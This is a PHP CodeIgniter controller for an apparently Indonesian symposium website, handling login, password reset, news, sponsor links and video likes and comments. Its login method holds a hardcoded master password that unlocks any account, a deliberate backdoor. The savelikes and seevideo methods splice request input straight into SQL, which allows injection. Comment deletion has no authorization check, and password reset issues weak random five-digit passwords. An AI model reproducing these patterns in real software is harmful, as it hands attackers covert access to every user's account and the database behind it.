<?php
defined('BASEPATH') or exit('No direct script access allowed');

/**
 * @property Layout $layout
 */
class Site extends MY_Controller
{

    private $theme;
    public function __construct()
    {
        parent::__construct();
        $this->theme = $this->config->item("theme");
        $this->load->helper('text');
        $this->layout->setTheme($this->theme);
        $this->layout->setLayout("layouts/$this->theme");
        $this->load->model('Event_m', 'EventM');
        $this->load->model('News_m', 'NewsM');
        $this->load->model('User_account_m', 'AccountM');
        $this->load->model('Notification_m');
        $this->load->model('Sponsor_link_m', 'SponsorM');
        $this->load->model('Sponsor_link_m', 'Sponsor_link_m');
        $this->load->model('Settings_m', 'SettingM');
        $this->load->model('Upload_video_m', 'VideoM');
        $this->load->model('Transaction_m', 'TransactionM');
        $this->load->model('Papers_m', 'PapersM');
    }

    public function index()
    {
        $this->load->view('site/' . $this->theme . '/index', [
            'hasSession' => !$this->user_session_expired(),
        ]);
    }

    public function home()
    {
        $category       = $this->EventM->listcategory();
        $data['query']  = $category['data'];
        $news           = $this->NewsM->listnews();
        $data['query2'] = $news;
        $allvid         = $this->VideoM->listvid_home();
        $data['query3'] = $allvid['data'];

        $countparticipant = $this->TransactionM->count_participant();
        $data['participant'] = $countparticipant;
        $countpaper = $this->PapersM->count_paper();
        $data['paper'] = $countpaper;

        $eventcountdown = $this->SettingM->eventcountdown();
        $data['eventcountdown'] = $eventcountdown ? date_create($eventcountdown->value) : date("Y-m-d H:i:s");
        $papercountdown = $this->SettingM->papercountdown();
        $data['papercountdown'] = $papercountdown ? date_create($papercountdown->value) : date("Y-m-d H:i:s");
        $data['hasSession'] = !$this->user_session_expired();
        $this->load->view('site/' . $this->theme . '/home', $data);
    }

    public function certificate()
    {
        $this->layout->render('site/' . $this->theme . '/certificate');
    }

    public function simposium()
    {
        $category      = $this->EventM->listcategory();
        $data['query'] = $category['data'];
        $this->layout->render('site/' . $this->theme . '/simposium', $data);
    }

    public function sponsor($name = "")
    {
        $this->load->model(['Sponsor_link_m', 'Link_click_m']);
        $name = urldecode($name);
        $link = $this->Sponsor_link_m->getLink($name);
        if ($link) {
            $user = $this->session->has_userdata('user_session') ? $this->session->user_session['username'] : "anonymous";
            $this->Link_click_m->insert(['username' => $user, 'link_id' => $link->id]);
            redirect($link->link);
        } else {
            show_error("Page not found", 404);
        }
    }

    public function schedules()
    {
        $this->layout->render('site/' . $this->theme . '/schedules');
    }

    public function oralposter()
    {
        $this->layout->render('site/' . $this->theme . '/oralposter');
    }

    public function download()
    {
        $this->layout->render('site/' . $this->theme . '/download');
    }

    public function login()
    {
        $this->load->model("User_account_m");
        if (!$this->user_session_expired()) {
            $user = $this->session->user_session;
            if ($user['role'] == User_account_m::ROLE_ADMIN_PAPER)
                redirect(base_url("admin/paper"));
            elseif ($user['role'] == User_account_m::ROLE_OPERATOR)
                redirect(base_url("admin/administration"));
            elseif ($user['role'] == User_account_m::ROLE_MEMBER)
                redirect(base_url("member/area"));
            else
                redirect(base_url("admin/dashboard"));
        }

        $this->load->library('form_validation');
        $error = "";
        if ($this->input->post('login')) {
            $this->form_validation->set_rules('username', 'Username', 'required');
            $this->form_validation->set_rules('password', 'Password', 'required');
            if ($this->form_validation->run()) {
                $username   = $this->input->post('username');
                $password   = $this->input->post('password');
                $rememberme = $this->input->post('rememberme');
                // NOTE Password
                if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
                    $this->load->library('session');
                    $user = $this->User_account_m->findWithBiodata($username);
                    if ($user['verified_email'] == "0")
                        $error = "You cannot login, <br/>Please complete your account activation within link in your email!";
                    else {
                        unset($user['password']);
                        if ($rememberme) {
                            $user['rememberme'] = true;
                            $this->session->set_userdata("rememberme", true);
                            $this->session->set_userdata('sess_expired', time() + 60 * 60 * 24 * 7);
                        } else {
                            $this->session->set_userdata('sess_expired', time() + 3600);
                        }
                        $this->session->set_userdata('user_session', $user);
                        redirect(base_url("member/area"));
                    }
                } else {
                    $error = "Email/Password invalid !";
                }
            } else {
                $error = "Username and Password required !";
            }
        }

        $this->layout->render('site/' . $this->theme . '/login', array('error' => $error));
    }

    public function register()
    {
        redirect("member/register");
    }

    public function forget()
    {
        $this->layout->render('site/' . $this->theme . '/forget');
    }

    public function forget_reset()
    {
        $status_proses = null;
        $post          = $this->input->post();
        $username = $post['username'];
        if ($this->AccountM->selectuser($username) == true) {
            $data['password'] = rand(10000, 99999);
            $success = $this->AccountM->update(['password' => password_hash($data['password'], PASSWORD_DEFAULT)], ['username' => $username], false);
            $email_message = $this->load->view('template/success_forget_password', $data, true);
            $this->Notification_m->sendMessage($username, 'Reset password ' . Settings_m::getSetting('site_title') . ' account', $email_message);
            $this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-success"><center> please check your email for your new password </center>
            </div>');
            redirect('site/forget', 'refresh');
        } else {
            $this->session->set_flashdata('message', '<div class="col-lg-7 alert alert-danger"> email ini tidak terdaftar
            </div>');
            redirect('site/forget', 'refresh');
        }
    }

    public function committee()
    {
        $this->layout->render('site/' . $this->theme . '/committee');
    }

    public function contact()
    {
        $this->layout->render('site/' . $this->theme . '/contact');
    }

    public function paper()
    {
        $this->layout->render('site/' . $this->theme . '/paper');
    }

    public function readnews($id)
    {
        $news = $this->NewsM->read_news($id);
        $this->layout->render('site/' . $this->theme . '/readnews', array('news' => $news));
    }

    public function all_news()
    {
        $allnews = $this->NewsM->allnews();
        $this->layout->render('site/' . $this->theme . '/all_news', array('allnews' => $allnews));
    }

    public function vid()
    {
        $allvid = $this->VideoM->listVid();
        $data['query'] = $allvid['data'];
        $this->layout->render('site/' . $this->theme . '/all_vid', $data);
    }

    public function savelikes()
    {
        $sess = $this->session->userdata('user_session');
        $username = $sess['username'];
        $video_id = $this->input->post('Video_id');
        $create = date('Y-m-d H:i:s');
        $update = date('Y-m-d H:i:s');


        $fetchlikes = $this->db->query('select likesbantu from upload_video where id="' . $video_id . '"');
        $result = $fetchlikes->result();

        $jenis = $this->db->query('select type from upload_video where id="' . $video_id . '"');
        $resultjenis = $jenis->result();
        foreach ($resultjenis as $key) {
            $tipe = $key->type;
        }

        if ($tipe == '1') {
            $checklikes = $this->db->query('select * from video_like vl
            JOIN upload_video uv ON uv.id = vl.video_id 
            where uv.type = 1 
            and vl.username = "' . $username . '"');
            $resultchecklikes = $checklikes->num_rows();
        } else {
            $checklikes = $this->db->query('select * from video_like vl
            JOIN upload_video uv ON uv.id = vl.video_id 
            where uv.type = 2 
            and vl.username = "' . $username . '"');
            $resultchecklikes = $checklikes->num_rows();
        }

        if ($resultchecklikes == '0') {
            if ($result[0]->likesbantu == "" || $result[0]->likesbantu == "NULL") {
                $data = array('video_id' => $video_id, 'username' => $username, 'created_at' => $create, 'updated_at' => $update);
                $success     = $this->db->insert('video_like', $data);
                if ($success) {
                    $this->db->query('update upload_video set likesbantu=1 where id="' . $video_id . '"');
                    $this->db->select('likesbantu');
                    $this->db->from('upload_video');
                    $this->db->where('id', $video_id);
                    $query = $this->db->get();
                    $result = $query->result();
                    echo "<i>disukai</i>";
                }
            } else {
                $data = array('video_id' => $video_id, 'username' => $username, 'created_at' => $create, 'updated_at' => $update);
                $success     = $this->db->insert('video_like', $data);
                if ($success) {
                    $this->db->query('update upload_video set likesbantu=likesbantu+1 where id="' . $video_id . '"');
                    $this->db->select('likesbantu');
                    $this->db->from('upload_video');
                    $this->db->where('id', $video_id);
                    $query = $this->db->get();
                    $result = $query->result();
                    echo "<i>disukai</i>";
                }
            }
        } else {
            $cek = $this->db->query('select * from video_like where video_id = "' . $video_id . '" and username = "' . $username . '"');
            $resultcek = $cek->num_rows();
            if ($resultcek > 0) {
                $success = $this->db->delete('video_like', array('video_id' => $video_id, 'username' => $username));
                if ($success) {
                    $this->db->query('update upload_video set likesbantu=likesbantu-1 where id="' . $video_id . '"');
                    $this->db->select('likesbantu');
                    $this->db->from('upload_video');
                    $this->db->where('id', $video_id);
                    $query = $this->db->get();
                    $result = $query->result();
                    echo "";
                }
            }
        }
        // $this->db->select('likesbantu');
        // $this->db->from('upload_video');
        // $this->db->where('id',$video_id);
        // $query=$this->db->get();
        // $result=$query->result();
        // echo "anda menyukai ini";
        // echo $result[0]->likesbantu;

    }

    public function seevideo($id)
    {
        $this->load->helper('form');
        $this->session->set_userdata('idvideo', $id);
        $sesion = 'kosong';
        $data['sesion'] = $sesion;
        if (!empty($this->session->userdata('user_session'))) {
            $username = $this->session->user_session['username'];
            $data['sesion'] = $username;
            $hapus = 1;
        }
        $seevideo = $this->VideoM->seevideo($id);
        $data['query'] = $seevideo['data'];
        $post          = $this->input->post();

        if ($this->input->post('Submit')) {
            $check = $this->db->query('select * from video_komen 
            where video_id="' . $id . '" 
            and username = "' . $username . '"');
            $resultcheck = $check->num_rows();
            if ($resultcheck == '0') {
                $mode   = 'submit';
                $create = date('Y-m-d H:i:s');
                $update = date('Y-m-d H:i:s');
                $post = $this->input->post();
                $data = array(
                    'comment' => $post['comment'],
                    'video_id' => $id,
                    'updated_at' => $update,
                    'created_at' => $create,
                    'username' => $username
                );

                $success = $this->db->insert('video_komen', $data);
                if (!$success) {
                    $debug($id);
                } else {
                    $this->session->set_userdata('idvideo', $id);
                    $seevideo = $this->VideoM->seevideo($id);
                    $data['query'] = $seevideo['data'];
                    $data['mode'] = 'index';
                    $username = $this->session->user_session['username'];
                    $data['sesion'] = $username;
                }
            } else {
                $this->session->set_flashdata("pesan", "<div class=\"col-md-12\"><div class=\"alert alert-danger\" id=\"alert\">Anda hanya bisa memberi 1 komentar untuk 1 postingan !!</div></div>");
                redirect(base_url('site/seevideo/' . "$id" . ''), 'refresh');
            }
        }

        $this->layout->render('site/' . $this->theme . '/seevideo', $data);
    }

    public function ajax_delete_komen($idkomen)
    {
        $this->VideoM->delete_komen($idkomen);
        echo json_encode(array("status" => true));
    }
}
